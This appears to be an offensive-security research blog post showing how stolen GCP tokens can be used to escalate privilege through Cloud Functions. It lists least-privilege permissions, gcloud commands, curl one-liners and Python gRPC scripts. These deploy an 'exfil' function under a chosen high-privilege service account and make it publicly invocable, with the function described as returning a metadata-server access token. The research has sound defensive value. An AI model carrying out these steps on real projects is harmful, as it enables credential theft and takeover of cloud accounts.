# GCP Cloud Function Abuse Research
[CLOUD FUNCTION UPDATE]
- [Phase I - Ways to Deploy a Cloud Function in Google Cloud Platform](#phase-i---ways-to-deploy-a-cloud-function-in-gcp)
  - [Ways to upload code in Cloud Function](#ways-to-upload-code-in-cloud-function-in-gcp)
  - [Permission Required for Deploying a Cloud Function (via gCloud)](#permission-required-for-deploying-a-cloud-function-via-gcloud)
    - [Deploying a Cloud Function via gCloud](#deploying-a-cloud-function-via-gcloud) 
  - [Permission Required for Deploying a Cloud Function (via gRPC & REST)](#permission-required-for-deploying-a-cloud-function-via-grpc--rest)
    - [Deploying a Cloud Function via Cloud Function API (gRPC)](#deploying-a-cloud-function-via-cloud-function-api-grpc)
    - [Deploying a Cloud Function via Cloud Function API (REST)](#deploying-a-cloud-function-via-cloud-function-api-rest)
- [Phase II - Ways to Set IAM Policy Binding to a Cloud Function in Google Cloud Platform](#phase-ii---ways-to-set-iam-policy-binding-to-a-cloud-function-in-google-cloud-platform)
  - [Permission Required to Set IAM Policy Binding to a Cloud Function](#permission-required-to-set-iam-policy-binding-to-a-cloud-function)
    - [Setting IAM Policy Binding to the Cloud Function (gCloud)](#setting-iam-policy-binding-to-the-cloud-function-gcloud)
    - [Setting IAM Policy Binding to the Cloud Function (REST)](#setting-iam-policy-binding-to-the-cloud-function-rest)
    - [Setting IAM Policy Binding to the Cloud Function (gRPC)](#setting-iam-policy-binding-to-the-cloud-function-grpc)
- [Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform](#phase-iii---privilege-escalating-via-cloud-function-in-google-cloud-platform)
  - [Deploying the Cloud Function (via gRPC)](#)
  - [Setting IAM Policy Binding to the Cloud Function (gRPC)](#)
  - [Invoking the Cloud Function](#)
  - [Escalating Privilege to a high level Service Account](#)

<br>

## Phase I - Ways to Deploy a Cloud Function in GCP

There are three ways to deploy a Cloud Function in GCP: 

1. Cloud Console
2. gCloud Command
3. Cloud Function API (REST & gRPC)

While Cloud Console may seem user-friendly for creating resources in GCP, we won't be using it. The reason being, creating resources in GCP often involves navigating through different pages, each with its own set of permissions. Depending on the user's level of access, they may not be able to view or access certain pages necessary to create a particular resource. It's important to have a number of permissions in place to ensure that a user can perform the actions they need to within the GCP environment. 

Our focus in this blog is on creating a Cloud Function using the least privileges possible. That's also the reason why attackers tend to use the gCloud command and Cloud Function API (via gRPC or REST) to create resources. Furthermore, attackers mainly gain access to a GCP environment using stolen or compromised authentication tokens (auth_tokens). Cloud Console doesn't support authentication via auth_tokens. As a result, attackers may prefer to use the gCloud command or directly call the Cloud Function API via gRPC or REST API to create resources because they offer more flexibility in terms of authentication and control.

<br>

### Ways to upload code in Cloud Function in GCP

If you're creating a Cloud Function in GCP, you can use **Cloud Console, gCloud Command, **or** Cloud Function API** to do so. Regardless of the method you choose, you will need to upload the code into the Cloud Function. There are three different ways to upload the code:

1. Local Machine
2. Cloud Storage
3. Cloud Repository

<p><img src="https://github.com/anrbn/blog/blob/main/images/7.jpg"></p>
<br>

### Permission Required for Deploying a Cloud Function (via gCloud)

Let's start with the first step of deploying/creating a Cloud Function. As always every action in GCP requires you to have a certain amount of Permissions. Here's the list of least number of permissions that's required to "Deploy a Cloud Function via gCloud"

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Deploy via gCloud</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage (Different Project)</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository
(Different Project)</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/8.jpg">
</p>

> Note: 
>1. Different Project means the Source Code is uploaded to a Cloud Storage / Repository of a project different than the one being exploited. It is the attacker controlled project where the attacker has full control.
>2. Last two permissions in bottom right (`source.repos.get` & `source.repos.list`) are required to be granted to the "Google Cloud Functions Service Agent" in Attacker's controlled project for it to be able to read the repository from attacker's project and upload the code in the Function. 
>3. The format of the service account email for the Google Cloud Functions Service Agent is `service-{PROJECT_NUMBER}@gcf-admin-robot.iam.gserviceaccount.com`. Figuring out the Google Cloud Functions Service Agent email requires one to know the Project Number, which might need additional permissions. 

### Deploying a Cloud Function via gCloud

<table>
  <tr>
   <td colspan="3" align="center"><strong>Command to Deploy Cloud Function via gCloud</strong></td>
  </tr>
  <tr>
   <td><strong>Source Code Upload via: Local Machine</strong></td>
   <td>gcloud functions deploy &lt;function-name> --runtime=python38 --source=. --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
   </tr>
   
<tr>
  <td><strong>Source Code Upload via: Cloud Storage</strong></td>
   <td>gcloud functions deploy &lt;function-name> --runtime=python38 --source=&lt;gs-link-to-zipped-sourcecode> --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
 </tr>
  <tr>
 <td><strong>Source Code Upload via: Cloud Repository</strong></td>
 <td>gcloud functions deploy &lt;function-name> --runtime=python38 --source=&lt;gs-link-to-zipped-sourcecode> --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
 </tr>
</table>

>Note: You might encounter an Error: "*ERROR: (gcloud.functions.deploy) ResponseError: status=[403], code=[Ok], message=[Permission 'cloudfunctions.operations.get' denied on resource 'operations/bzQ2MjAvdXMtY2VudHJhbDEvZXhmaWwxL18yTjJSYkp6alBB' (or resource may not exist).]*". Don't worry about it, the Cloud Function will be created regardless without any errors.  
<br>

### Permission Required for Deploying a Cloud Function (via gRPC & REST)

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Deploy via Cloud Function API (gRPC & REST)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/9.jpg">
</p>
  
>Note: You might need additional permissions to successfully upload code from the two sources: Local Machine and Cloud Repository via Cloud Function API (gRPC & REST).  However, for the Source: Cloud Storage, the permissions listed are the least that's required. Since it's easier to do it via Cloud Storage, why even bother with the other two? :)

### Deploying a Cloud Function via Cloud Function API (gRPC)

Every permission mentioned in the list seems to do something which is quite clear from their name. But here's something I found really strange, why is there a need for  `cloudfunctions.functions.get` permission for creating a Cloud Function? As far as the documentation goes the description for the permission `cloudfunctions.functions.get` says view functions. ([Link](https://cloud.google.com/functions/docs/reference/iam/permissions))

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/1.JPG">
</p>

Which means `cloudfunctions.functions.get` permission allows a user or service account to view metadata about a Cloud Function, such as its name, runtime, entry point, trigger settings, and other configuration details. What I guess is, it may be a default behavior of gCloud to include this permission when creating a function but it is not necessary for the creation of the function.

Using tools like gCloud can be convenient, but sometimes gCloud requires additional permissions beyond what is actually needed for the task at hand. This can result in unnecessarily permission requirements for users. 

One way to narrow down the permission requirements is to not rely on tools like gCloud at all, but to use the Cloud Function API yourself. Cloud Function API can be called via gRPC and REST APIs. Using gRPC or REST APIs can be more precise and efficient in terms of permissions to create resources like Cloud Functions. gRPC and REST API allows us to specify only the necessary permissions for the specific task.

That being said let's look at how to "Deploy a Cloud Function via Cloud Function API (gRPC & REST)"

**Deploying a Cloud Function via Cloud Function API (gRPC)**

gRPC is an open-source Remote Procedure Call (RPC) framework developed by Google. While REST (Representational State Transfer) is an architectural style for building web-based software systems. REST APIs are commonly used to access and manage cloud resources. 

Won't go into much details and step straight into the point. Here is the list of least number of permission required to successfully deploy a Cloud Function via Cloud Function API (gRPC & REST). 

If you take a look at the above Images (Image 3 & 5), it's clear that of the two methods for deploying a Cloud Function (gCloud and Cloud Function API), uploading the source code via Cloud Storage using the Cloud Function API requires the least amount of permissions and can easily be chosen over any other method.

Let's call the Cloud Function API using both gRPC and REST to deploy a Cloud Function (Code Upload Source: Cloud Storage). 

Below is a code that's calling the Cloud Function API via gRPC to deploy a Cloud Function in GCP. It's using the method `create_function()` from the `google.cloud.functions_v1.CloudFunctionsServiceClient` class. Note that for uploading the Source Code we will be using Cloud Storage, simply because it requires less number of permission than any other method (Check fig.3 & 5).

```python
from google.cloud.functions_v1 import CloudFunctionsServiceClient, CloudFunction, CreateFunctionRequest
import google.oauth2.credentials

#------change this--------
location = "us-east1"
function_name = "exfil11"
gsutil_uri = "gs://anirb/function.zip"
function_entry_point = "exfil"
project_id="nnnn-374620"
#-------------------------

access_token = input('Enter Access Token: ')
credentials = google.oauth2.credentials.Credentials(access_token)
client = CloudFunctionsServiceClient(credentials=credentials)

url = "https://{}-{}.cloudfunctions.net/{}".format(location, project_id, function_name)

function = CloudFunction(
    name="projects/{}/locations/{}/functions/{}".format(project_id, location, function_name),
    source_archive_url="{}".format(gsutil_uri),
    entry_point=function_entry_point,
    runtime="python38",
    https_trigger={},
)

request = CreateFunctionRequest(location="projects/{}/locations/{}".format(project_id, location), function=function)

try:
    response = client.create_function(request=request)
    result = response.result()
    print(f"[+] Function Invocation URL: {url}")
    print("[+] Cloud Function creation has started")
    print("[+] Takes 1-2 minutes to create")

except Exception as e:
    if "cloudfunctions.operations.get" in str(e):
        print("[+] Permission cloudfunctions.operations.get denied (Not an Issue)")
        print(f"[+] Function Invocation URL: {url}")
        print("[+] Cloud Function creation has started")
        print("[+] Takes 1-2 minutes to create")
        
    else:
        print(f"[!] Error: {str(e)}")
```
<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/3.JPG">
</p>

Even though a warning pops up that "*Permission cloudfunctions.operations.get denied on resource*" the Cloud Function will be successfully created. The warning is likely due to some internal operations being performed by the Cloud Function service during the creation process.  
 
The Cloud Function however will be created with just the following permissions:
* `iam.serviceAccounts.actAs`
* `cloudfunctions.functions.create`

### Deploying a Cloud Function via Cloud Function API (REST)

Here's another way to call the Cloud Function API using REST. Below is a curl command which makes HTTP POST request to the Google Cloud Functions API to create a new Cloud Function using required parameters. 

```shell
curl -X POST \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"name":"projects/<project-id>/locations/<region>/functions/<function-name>","entryPoint":"<function-entrypoint>","runtime":"python38","serviceAccountEmail":"<service-account-email>","sourceArchiveUrl":"<gs-link-to-zipped-sourcecode>","httpsTrigger":{}}' \
  https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json

```
Here's the oneliner which can run in `cmd` without any errors.

```shell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"name\":\"projects/<project-id>/locations/<region>/functions/<function-name>\",\"entryPoint\":\"<function-entrypoint>\",\"runtime\":\"python38\",\"serviceAccountEmail\":\"<service-account-email>\",\"sourceArchiveUrl\":\"<gs-link-to-zipped-sourcecode>\",\"httpsTrigger\":{}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json
```

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/2.JPG">
</p>

Modify the parameters according to your need

<table>
  <tr>
   <td>&lt;token> 
   </td>
   <td>&lt;token> is a placeholder for an actual authorization token that is required to authenticate and authorize the API request. Run the command 
"**gcloud auth application-default print-access-token**" to get the token.
   </td>
  </tr>
  <tr>
   <td>&lt;project-id>
   </td>
   <td>The ID of the Google Cloud project in which the Cloud Function will be created.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function will be deployed. For example, "us-central1".
   </td>
  </tr>
  <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function being created.
   </td>
  </tr>
  <tr>
   <td>&lt;function-entrypoint>
   </td>
   <td>The name of the entry point function for the Cloud Function. This is the function that will be executed when the Cloud Function is triggered.
   </td>
  </tr>
  <tr>
   <td>&lt;service-account-email>
   </td>
   <td>The email address of the service account that will be used to run the Cloud Function. Choosing a Service Account with high privileges will help you Privilege Escalate easier.
   </td>
  </tr>
  <tr>
   <td>&lt;gs-link-to-zipped-sourcecode>
   </td>
   <td>The URL of the Cloud Storage archive file that contains the source code for the Cloud Function. The archive file must be in ZIP format. Example: gs://bucket-name/code.zip
   </td>
  </tr>
</table>

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/4.JPG">
</p>

However, invoking the function will lead to the following error (fig.9): *Your client does not have permission to get URL.* The client doesn't have required role `Cloud Function Invoker` to invoke the function.

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/5.JPG">
</p>

## Phase II - Ways to Set IAM Policy Binding to a Cloud Function in Google Cloud Platform

Creating/Deploying a Cloud Function is just the first step in the process. Making it available for invocation is the second.

When you create a Cloud Function in GCP, it is not immediately accessible for invocation. Before you can invoke the function, you need to set up the necessary IAM permissions to allow access to the function and control who has access to your Cloud Function and what they can do with it.

To set up IAM permissions for your Cloud Function, you can add one or more members to a Cloud Function's IAM policy. Members can be individual user accounts, groups of users, or service accounts. You can assign roles to these members, which determine the actions they can perform on the function. 

Now, there's a special member called `allUsers` that represents anyone on the internet. We will be granting the member : `allUsers` the role : `Cloud Function Invoker`. This will allow anyone on the internet to invoke the Cloud Function without requiring authentication. 

>Note: Granting allUsers permissions to a Cloud Function, you are essentially making your Cloud Function publicly accessible to anyone who knows the URL.

In order to grant the `allUsers` member the `Cloud Function Invoker` role, the user or service account performing the operation must have certain permissions. 
<br>

### Permission Required to Set IAM Policy Binding to a Cloud Function

Here's the list of least number of permissions that's required to give a member or group the role `Cloud Function Invoker` to Invoke a Cloud Function (gCloud & Cloud Function API):

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Invoke via gCloud</strong></td>
  </tr>
  <td>cloudfunctions.functions.getIamPolicy</td>
  <tr>
  <td>cloudfunctions.functions.setIamPolicy</td>
</table>

<table>
  <tr>
   <td colspan="3"align="center"><strong>Cloud Function Invoke via Cloud Function API (REST & gRPC)</strong></td>
  </tr>
  <td>cloudfunctions.functions.setIamPolicy</td>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/blog/blob/main/images/10.jpg">
</p>

Once again Cloud Function API (REST & gRPC) stands out as it requires less amount of permission to give a member or group the role `Cloud Function Invoker` to Invoke a Cloud Function. 

### Setting IAM Policy Binding to the Cloud Function (gCloud)

Anyways here's the gCloud command that grants `Cloud Function Invoker` role to a member/group. 

```shell
gcloud functions add-iam-policy-binding <function-name> --region=<region> --member=allUsers --role=roles/cloudfunctions.invoker
```
<table>
 <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function created.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function was deployed. For example, "us-central1".
   </td>
  </tr>
  </table>

Above gCloud command adds an IAM policy binding to a Google Cloud Functions resource, allowing all users, even unauthenticated 
(--member=allUsers) to invoke the specified function (&lt;function-name>) in the specified region (--region=&lt;region>) with the cloudfunctions.invoker role 
(--role=roles/cloudfunctions.invoker). It requires you to have both `cloudfunctions.functions.getIamPolicy` & `cloudfunctions.functions.setIamPolicy` permissions. We can narrow down the permission to just one, using Cloud Function API.

### Setting IAM Policy Binding to the Cloud Function (REST)

Here's the curl command that adds an IAM policy binding of `allUsers` with `Cloud Function Invoker` role to a Cloud Function:

```shell
curl -X POST \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{
          "policy": {
            "bindings": [
              {
                "role": "roles/cloudfunctions.invoker",
                "members": [
                  "allUsers"
                ]
              }
            ],
            "version": 3
          }
        }' \
     https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```
Here's the oneliner which can run in `cmd` without any errors.

```shell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"policy\":{\"bindings\":[{\"role\":\"roles/cloudfunctions.invoker\",\"members\":[\"allUsers\"]}],\"version\":3}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>:setIamPolicy
```

Modify the parameters according to your need

<table>
  <tr>
   <td>&lt;token> 
   </td>
   <td>&lt;token> is a placeholder for an actual authorization token that is required to authenticate and authorize the API request. 
   <br>Run the command "<strong>gcloud auth application-default print-access-token</strong>" to get the token.
   </td>
  </tr>
  <tr>
   <td>&lt;project-id>
   </td>
   <td>The ID of the Google Cloud project in which the Cloud Function was created.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function was deployed.
   </td>
  </tr>
  <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function.
   </td>
  </tr>
</table>

### Setting IAM Policy Binding to the Cloud Function (gRPC)

You can also use the gRPC API to add the IAM policy binding of `allUsers` with the role `Cloud Function Invoker` to a Cloud Function. Here's the code for that.

```python
from google.iam.v1.policy_pb2 import Policy, Binding
from google.cloud.functions_v1 import CloudFunctionsServiceClient
import google.auth

credentials, project_id = google.auth.default()

#------change this--------
location = "us-east1"
function_name = "exfil11"
#-------------------------

client = CloudFunctionsServiceClient(credentials=credentials)
name = "projects/{}/locations/{}/functions/{}".format(project_id, location, function_name)

policy = client.get_iam_policy(request={"resource": name})
binding = Binding(
    role="roles/cloudfunctions.invoker",
    members=["allUsers"],
)
policy.bindings.append(binding)
response = client.set_iam_policy(request={"resource": name, "policy": policy})
print("[+] Done.")
```
## Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform
To Privilege Escalate via Cloud Function in Google Cloud Platform we'll be taking the path with least privileges possible. 
- Deploying the Cloud Function
  - Identify how you'd to **Upload the Source Code** & via which method.
    - Ways to upload the Source Code: Local Machine, Cloud Storage, Cloud Repository
    - Methods Available: gCloud, Cloud Function API (gRPC/REST)
- Setting IAM Policy Binding to the Cloud Function
  - Identify how you'd **Set the IAM Policy Binding to the Cloud Function**.
    - Methods Available: gCloud, Cloud Function API (gRPC/REST)

**Deploying the Cloud Function**: We'll deploy the Cloud Function by setting the Source Code from Cloud Storage via the Cloud Function API (gRPC) as it requires the least privileges.

**Setting IAM Policy Binding to the Cloud Function**: We'll set the IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC) as it's the one that does it with least permissions than others.

>Note: One can use either gRPC or REST to make requests to the Cloud Function API, the Cloud Function API will then interact with the Cloud Functions service. The Permissions required to Deploy and Set IAM Policy Binding are same for both gRPC and REST.

These are the permissions required for the overall task:
- `iam.serviceAccounts.actAs`
- `cloudfunctions.functions.create`
- `cloudfunctions.functions.setIamPolicy`

### Deploying the Cloud Function (via gRPC)
Use the following script to deploy the Cloud Function. This script sets the source code for a Cloud Function using Cloud Storage.


```python
from google.cloud.functions_v1 import CloudFunctionsServiceClient, CloudFunction, CreateFunctionRequest
import google.oauth2.credentials

#------change this--------
location = "us-east1"
function_name = "exfil11"
gsutil_uri = "gs://anirb/function.zip"
function_entry_point = "exfil"
project_id="nnnn-374620"
#-------------------------

access_token = input('Enter Access Token: ')
credentials = google.oauth2.credentials.Credentials(access_token)
client = CloudFunctionsServiceClient(credentials=credentials)

url = "https://{}-{}.cloudfunctions.net/{}".format(location, project_id, function_name)

function = CloudFunction(
    name="projects/{}/locations/{}/functions/{}".format(project_id, location, function_name),
    source_archive_url="{}".format(gsutil_uri),
    entry_point=function_entry_point,
    runtime="python38",
    https_trigger={},
)

request = CreateFunctionRequest(location="projects/{}/locations/{}".format(project_id, location), function=function)

try:
    response = client.create_function(request=request)
    result = response.result()
    print(f"[+] Function Invocation URL: {url}")
    print("[+] Cloud Function creation has started")
    print("[+] Takes 1-2 minutes to create")

except Exception as e:
    if "cloudfunctions.operations.get" in str(e):
        print("[+] Permission cloudfunctions.operations.get denied (Not an Issue)")
        print(f"[+] Function Invocation URL: {url}")
        print("[+] Cloud Function creation has started")
        print("[+] Takes 1-2 minutes to create")
        
    else:
        print(f"[!] Error: {str(e)}")
```


The code will query the metadata server and retrieve an access token and then print that token to the logs and response body when a request is made to that specific endpoint.
